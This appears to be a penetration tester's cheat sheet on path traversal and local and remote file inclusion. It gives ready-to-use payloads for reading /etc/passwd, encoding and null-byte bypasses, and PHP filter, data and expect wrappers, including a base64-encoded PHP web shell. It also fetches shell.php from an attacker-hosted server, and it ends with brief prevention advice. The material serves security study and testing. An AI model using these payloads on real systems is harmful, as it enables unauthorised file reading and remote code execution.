## Methodology

- [ ] Find for where file is being retrieved, understand the application technology and system (Windows or Linux).
- [ ] Scanner + Ffuf with LFI payloads
- [ ] Test functionality like file-upload which could be chain with Path-Traversal.
- [ ] Test with ../../.. first, see if this will retrieve the whole directory.
- [ ] Test with retrieving a file ../../../etc/passwd.
- [ ] Test with single/double encoded sequence and blacklist bypasses.
- [ ] Test Null-Byte extension and validation with start path

Reading files on the server that is running on the application. Typically files in web application are stored in the `/var/www/html` path. An attacker can append `../../../etc/passwd` to read the `/etc/passwd` file.

### Automation
(FFuf) LFI Detection
- Test with character URL encoding
```bash
ffuf -u 'https://0a9f00ff03e566cc80584e6400250096.web-security-academy.net/image?filename=FUZZ' -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -c -e .jpg
```
### Local File Inclusion (LFI)

### Stripping Path Traversal Sequence

A protection against path traversal is `../../` sequence being stripped by web application. These can possibly be bypassed by:

- Absolute Path from filesystem root: `/etc/passwd` (no `../../../` sequence)
- Nested traversal sequence: `....//....//....//`
- Parameter of `multipart/form-data` request, traversal sequence maybe encoded `../` â†’ `%2e%2e%2f` or double encoded `%252e%252e%252f` . **Non-standard encoding**, `..%c0%af` or `..%ef%bc%8f` may work

### Validation of Start Path

Some application may require user-supplied filename to start with base folder such as `/var/www/html` , so sequences `/var/www/html/../../../etc/passwd` may work.

### Null-Byte Bypass Extension

Some user-supplied filename require to end with expected file extension. This can be done with Null-byte. `filename=../../../etc/passwd%00.png`

- There can be other null-bytes similar to file upload vulnerabilities.

### Second-Order LFI

An example of a Second-Order LFI is when an application allows us to download avatar through URL like /profile/$username/avatar.png). A malicious username such as ../../../etc/passwd may be able to pull another local file on the server instead of the avatar.

### PHP Filters

Allow us to access different I/O streams at the application level, like standard input/output, file descriptors and memory streams. Useful for File Inclusion & XXE attacks.

- PHP filter are a type of PHP wrappers, where we can pass different types of input and have it filtered by the filter we specify.

### Reading Source Code of LFI
- PHP filter wrapper to extract source code (here we are extracting index.php source code).

```xml
php://filter/read=convert.base64-encode/resource=index.php
```

Check php.ini file (/etc/php/X.Y/apache2/php.ini where X.Y is the installed version of PHP for **allowed_url_include** (required for the next attacks).

### RCE from LFI

- PHP data wrapper to include external data, including PHP code.

```bash
echo '<?php system($_GET["cmd"]); ?>' | base64

PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
```

```php
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==&cmd=whoami
```

- PHP expect wrapper to run command through URL streams. Need to check php.ini if **extension=expect**

```php
expect://id
```

### Remote File Inclusion (RFI)
- `allow_url_fopen` in php.ini
LFI parameters may introduce SSRF vulnerabilities, which testing for SSRF is the first step for RFI. After testing for SSRF, can attempt to call other domains which contain other files which can be executed.
### HTTP
- Host a HTTP web server containing malicious payload.
```
http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id
```
### FTP
- Host a FTP server containing malicious payload.

```
sudo python -m pyftpdlib -p 21

http://<SERVER_IP>:<PORT>/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id
```
### Prevention

- Avoid passing user-supplied input in API, application function can be rewritten to deliver the same behavior.
- Validate user-input, using whitelist or that input only contain permitted content like alphanumeric characters only.
- After validation append user-input to base directory and use a platform filesystem API to canonized the path. Verify that canonicalized path starts with expected base directory.